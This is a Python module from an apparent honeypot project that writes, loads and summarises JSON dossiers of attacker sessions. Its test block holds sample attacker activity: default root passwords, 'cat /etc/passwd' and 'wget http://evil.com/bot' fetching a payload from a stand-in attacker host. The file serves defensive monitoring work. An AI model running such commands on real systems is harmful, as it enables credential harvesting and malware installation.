#!/usr/bin/env python3
"""
MORPH - Dossier Generator

Generates JSON dossier files for honeypot sessions combining parsed data and classification.
"""

import json
from datetime import datetime
from pathlib import Path
from typing import Any

DOSSIERS_DIR = "morph/dossiers"


def _serialize_datetime(obj: Any) -> Any:
    """Convert datetime objects to ISO format strings."""
    if isinstance(obj, datetime):
        return obj.isoformat()
    return obj


def _prepare_session_data(session: dict[str, Any]) -> dict[str, Any]:
    """Prepare session data for JSON serialization."""
    return {
        "session_id": session.get("session_id"),
        "src_ip": session.get("src_ip"),
        "start_time": _serialize_datetime(session.get("start_time")),
        "end_time": _serialize_datetime(session.get("end_time")),
        "duration_seconds": session.get("duration_seconds", 0),
        "login_attempts": session.get("login_attempts", []),
        "commands": session.get("commands", []),
        "downloads": session.get("downloads", []),
    }


def generate(
    session: dict[str, Any],
    classification: dict[str, Any],
    adaptation_report: dict[str, Any] | None = None
) -> dict[str, Any]:
    """
    Generate a dossier for a session and save it to disk.

    Args:
        session: Session dict from the parser
        classification: Classification dict from the classifier
        adaptation_report: Optional adaptation report from adaptor module

    Returns:
        The generated dossier dict
    """
    session_id = session.get("session_id", "unknown")
    
    # Build dossier structure
    dossier = _prepare_session_data(session)
    dossier["classification"] = {
        "type": classification.get("type"),
        "intent": classification.get("intent"),
        "risk": classification.get("risk"),
        "matched_rules": classification.get("matched_rules", []),
    }
    
    # Include adaptation report if provided
    if adaptation_report:
        dossier["environment_adaptations"] = adaptation_report
    
    dossier["generated_at"] = datetime.utcnow().isoformat() + "Z"

    # Ensure dossiers directory exists
    dossiers_path = Path(DOSSIERS_DIR)
    dossiers_path.mkdir(parents=True, exist_ok=True)

    # Write dossier to file
    file_path = dossiers_path / f"{session_id}.json"
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(dossier, f, indent=2, default=_serialize_datetime)

    return dossier


def load(session_id: str) -> dict[str, Any] | None:
    """
    Load a single dossier by session ID.

    Args:
        session_id: The session ID to load

    Returns:
        The dossier dict or None if not found
    """
    file_path = Path(DOSSIERS_DIR) / f"{session_id}.json"
    
    if not file_path.exists():
        return None

    with open(file_path, "r", encoding="utf-8") as f:
        return json.load(f)


def load_all() -> list[dict[str, Any]]:
    """
    Load all saved dossiers.

    Returns:
        List of all dossier dicts
    """
    dossiers_path = Path(DOSSIERS_DIR)
    
    if not dossiers_path.exists():
        return []

    dossiers = []
    for file_path in dossiers_path.glob("*.json"):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                dossiers.append(json.load(f))
        except (json.JSONDecodeError, IOError) as e:
            print(f"Warning: Failed to load {file_path}: {e}")

    return dossiers


def summarize_all() -> dict[str, Any]:
    """
    Generate a summary of all dossiers.

    Returns:
        Summary dict with statistics
    """
    dossiers = load_all()
    
    if not dossiers:
        return {"total": 0, "by_risk": {}, "by_type": {}, "by_intent": {}}

    summary = {
        "total": len(dossiers),
        "by_risk": {"low": 0, "medium": 0, "high": 0},
        "by_type": {"bot": 0, "human": 0},
        "by_intent": {"recon": 0, "exploit": 0, "persistence": 0},
        "unique_ips": set(),
        "total_commands": 0,
        "total_downloads": 0,
    }

    for dossier in dossiers:
        classification = dossier.get("classification", {})
        
        risk = classification.get("risk", "low")
        if risk in summary["by_risk"]:
            summary["by_risk"][risk] += 1

        session_type = classification.get("type", "bot")
        if session_type in summary["by_type"]:
            summary["by_type"][session_type] += 1

        intent = classification.get("intent", "recon")
        if intent in summary["by_intent"]:
            summary["by_intent"][intent] += 1

        if dossier.get("src_ip"):
            summary["unique_ips"].add(dossier["src_ip"])

        summary["total_commands"] += len(dossier.get("commands", []))
        summary["total_downloads"] += len(dossier.get("downloads", []))

    # Convert set to count for JSON serialization
    summary["unique_ips"] = len(summary["unique_ips"])

    return summary


if __name__ == "__main__":
    print("MORPH Dossier Generator")
    print("=" * 60)

    # Create test session and classification
    test_session = {
        "session_id": "test_abc123",
        "src_ip": "192.168.1.100",
        "start_time": datetime(2024, 3, 15, 10, 30, 0),
        "end_time": datetime(2024, 3, 15, 10, 35, 45),
        "duration_seconds": 345,
        "login_attempts": [
            {"username": "root", "password": "admin", "success": False},
            {"username": "root", "password": "toor", "success": True},
        ],
        "commands": ["whoami", "uname -a", "cat /etc/passwd", "wget http://evil.com/bot"],
        "downloads": ["http://evil.com/bot"],
    }

    test_classification = {
        "type": "bot",
        "intent": "exploit",
        "risk": "high",
        "matched_rules": ["rapid_commands", "exploit_commands:wget", "has_downloads"],
    }

    # Generate dossier
    print("\nGenerating test dossier...")
    dossier = generate(test_session, test_classification)
    
    print(f"\nDossier saved to: {DOSSIERS_DIR}/{test_session['session_id']}.json")
    print("\nDossier content:")
    print(json.dumps(dossier, indent=2))

    # Load it back
    print("\n" + "-" * 60)
    print("Testing load functions...")
    
    loaded = load("test_abc123")
    print(f"load('test_abc123'): {'Found' if loaded else 'Not found'}")

    all_dossiers = load_all()
    print(f"load_all(): {len(all_dossiers)} dossier(s) found")

    # Summary
    print("\n" + "-" * 60)
    print("Summary:")
    summary = summarize_all()
    print(json.dumps(summary, indent=2))
